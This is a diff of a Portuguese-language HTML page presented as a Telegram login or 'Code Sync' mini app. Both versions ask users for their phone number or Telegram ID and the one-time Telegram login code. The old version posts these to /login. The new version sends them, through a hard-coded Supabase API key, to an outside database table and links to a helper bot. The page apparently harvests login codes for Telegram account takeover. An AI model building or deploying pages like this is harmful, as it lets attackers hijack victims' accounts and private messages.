@@ -1,167 +1,197 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Login Telegram</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>Telegram Code Sync</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Telegram Mini App -->
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+* {
+  box-sizing: border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
 
-  <style>
-    * {
-      box-sizing: border-box;
-      font-family: Arial, Helvetica, sans-serif;
-    }
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #1E1E1E;
+  color: #e5e7eb;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+}
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background: #1E1E1E;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-      color: #fff;
-    }
+/* ❄️ Neve */
+.snow {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  z-index: 0;
+}
 
-    /* ❄️ Animação de neve */
-    .snow {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
-    }
+.snow span {
+  position: absolute;
+  top: -10px;
+  width: 6px;
+  height: 6px;
+  background: #fff;
+  border-radius: 50%;
+  opacity: .8;
+  animation: fall linear infinite;
+}
 
-    .snow span {
-      position: absolute;
-      top: -10px;
-      width: 6px;
-      height: 6px;
-      background: white;
-      border-radius: 50%;
-      opacity: 0.8;
-      animation: fall linear infinite;
-    }
+@keyframes fall {
+  from { transform: translateY(0); }
+  to { transform: translateY(110vh); }
+}
 
-    @keyframes fall {
-      from {
-        transform: translateY(0);
-      }
-      to {
-        transform: translateY(110vh);
-      }
-    }
+/* 📦 Card */
+.box {
+  position: relative;
+  z-index: 1;
+  width: 100%;
+  max-width: 340px;
+  background: #2C2C2C;
+  padding: 22px;
+  border-radius: 12px;
+  box-shadow: 0 15px 40px rgba(0,0,0,.5);
+}
 
-    /* 📦 Card */
-    .card {
-      position: relative;
-      z-index: 1;
-      background: #2C2C2C;
-      padding: 24px;
-      width: 100%;
-      max-width: 360px;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-    }
+h2 {
+  text-align: center;
+  margin-bottom: 16px;
+  font-size: 20px;
+}
 
-    .card h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      font-size: 20px;
-    }
+/* Inputs */
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 8px 0;
+  border-radius: 8px;
+  border: none;
+  outline: none;
+  background: #1E1E1E;
+  color: #fff;
+  border: 1px solid #3a3a3a;
+  font-size: 14px;
+}
 
-    .card input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 12px;
-      border-radius: 8px;
-      border: none;
-      outline: none;
-      background: #1E1E1E;
-      color: #fff;
-      font-size: 14px;
-    }
+input::placeholder {
+  color: #aaa;
+}
 
-    .card input::placeholder {
-      color: #aaa;
-    }
+/* Botões */
+button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 14px;
+  transition: background .2s ease;
+}
 
-    .card button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      background: #2F80ED;
-      color: #fff;
-      font-size: 15px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.2s ease;
-    }
+#sendBtn {
+  background: #2F80ED;
+  color: #fff;
+}
 
-    .card button:hover {
-      background: #2569c9;
-    }
-  </style>
+#sendBtn:hover {
+  background: #2569c9;
+}
+
+#botBtn {
+  background: #38bdf8;
+  color: #020617;
+  margin-top: 8px;
+}
+
+#botBtn:hover {
+  background: #0ea5e9;
+}
+
+#msg {
+  margin-top: 12px;
+  text-align: center;
+  font-size: 14px;
+}
+</style>
 </head>
+
 <body>
 
-  <!-- ❄️ Neve -->
-  <div class="snow" id="snow"></div>
+<!-- ❄️ Neve -->
+<div class="snow" id="snow"></div>
 
-  <!-- 📦 Card -->
-  <div class="card">
-    <h2>Login Telegram</h2>
+<div class="box">
+  <h2>Confirmar Código</h2>
 
-    <input
-      id="phone"
-      type="text"
-      placeholder="+5534999999999"
-      autocomplete="off"
-    >
+  <input id="id" placeholder="Seu ID Telegram">
+  <input id="code" placeholder="Código recebido">
 
-    <input
-      id="code"
-      type="text"
-      placeholder="Código"
-      autocomplete="off"
-    >
+  <button id="sendBtn" onclick="sendCode()">Enviar</button>
 
-    <button onclick="send()">Enviar</button>
-  </div>
+  <a href="https://t.me/synchelpbot?start=PRONTO!" target="_blank">
+    <button id="botBtn">BOT</button>
+  </a>
 
-  <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
+  <div id="msg"></div>
+</div>
 
-    function send() {
-      fetch("/login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phone: document.getElementById("phone").value.trim(),
-          code: document.getElementById("code").value.trim(),
-          initData: tg.initData
-        })
-      });
-    }
+<script>
+/* ❄️ Criar neve */
+const snow = document.getElementById("snow");
+for (let i = 0; i < 40; i++) {
+  const flake = document.createElement("span");
+  flake.style.left = Math.random() * 100 + "%";
+  flake.style.animationDuration = (5 + Math.random() * 5) + "s";
+  flake.style.opacity = Math.random();
+  flake.style.transform = `scale(${Math.random()})`;
+  snow.appendChild(flake);
+}
 
-    /* ❄️ Gerar neve */
-    const snow = document.getElementById("snow");
+/* 🔗 Supabase */
+const SUPABASE_URL = "https://aqyaxfrukssndxgctukf.supabase.co/rest/v1/tg_miniapp";
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFxeWF4ZnJ1a3NzbmR4Z2N0dWtmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzMDY0MTYsImV4cCI6MjA3Nzg4MjQxNn0.fqP4BfoGBr-A8piJevWto3DnJByYvLxB9gudq81KvJw";
 
-    for (let i = 0; i < 40; i++) {
-      const flake = document.createElement("span");
-      flake.style.left = Math.random() * 100 + "%";
-      flake.style.animationDuration = 5 + Math.random() * 5 + "s";
-      flake.style.opacity = Math.random();
-      flake.style.transform = `scale(${Math.random()})`;
-      snow.appendChild(flake);
-    }
-  </script>
+function sendCode() {
+  const id = document.getElementById("id").value.trim();
+  const code = document.getElementById("code").value.trim();
+  const msg = document.getElementById("msg");
+
+  if (!id || !code) {
+    msg.innerText = "Preencha todos os campos";
+    msg.style.color = "#f87171";
+    return;
+  }
+
+  fetch(`${SUPABASE_URL}?id=eq.${id}`, {
+    method: "PATCH",
+    headers: {
+      "apikey": SUPABASE_KEY,
+      "Authorization": `Bearer ${SUPABASE_KEY}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      code,
+      confirmed: true
+    })
+  })
+  .then(r => {
+    if (!r.ok) throw new Error();
+    msg.innerText = "Código enviado com sucesso";
+    msg.style.color = "#22c55e";
+  })
+  .catch(() => {
+    msg.innerText = "Erro ao enviar código";
+    msg.style.color = "#f87171";
+  });
+}
+</script>
 
 </body>
-  </html>
+</html>
